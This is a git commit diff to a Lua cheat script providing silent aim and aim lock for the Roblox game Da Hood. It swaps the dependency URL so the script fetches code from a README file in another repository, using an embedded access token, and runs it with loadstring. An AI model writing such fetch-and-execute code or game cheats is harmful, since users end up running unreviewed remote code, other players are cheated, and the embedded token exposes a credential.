2c6cee4f2f4d7a214ca2997e7511d04bc2c0cc59
bobobexz <95143120+bobobexz@users.noreply.github.com>
2021-12-26 16:58:01 +0000

    Update SilentAimAimLock.lua

--- Games/Da Hood/SilentAimAimLock.lua
+++ Games/Da Hood/SilentAimAimLock.lua
@@ -1,5 +1,5 @@
 -- // Dependencies
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Universal/Aiming/Module.lua"))()
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/bobobexz/ewxe/main/README.md?token=AWV4JUBOW37CPTMWIPTWVRTBZCPUA"))()
 Aiming.TeamCheck(false)
 
 -- // Services
